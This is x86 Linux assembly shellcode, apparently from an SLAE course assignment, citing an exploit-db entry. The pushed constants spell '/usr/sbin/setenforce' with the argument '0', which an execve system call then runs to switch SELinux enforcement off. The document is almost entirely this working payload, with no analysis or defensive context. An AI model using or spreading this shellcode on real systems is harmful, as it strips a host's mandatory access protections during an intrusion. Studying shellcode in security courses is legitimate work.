; Student ID: SLAE - 871
; code can be found at: https://www.exploit-db.com/exploits/41403/
; below the source code


global _start          
section .text
_start:
    push 0xb   
        pop eax
    xor edx, edx
    push edx
    push byte 0x30
    mov ecx, esp
    push edx
    push 0x6563726f
    push 0x666e6574
    push 0x65732f6e
    push 0x6962732f
    push 0x7273752f
    mov ebx, esp
    push edx
    push ecx
    push ebx
    mov ecx, esp
    int 0x80
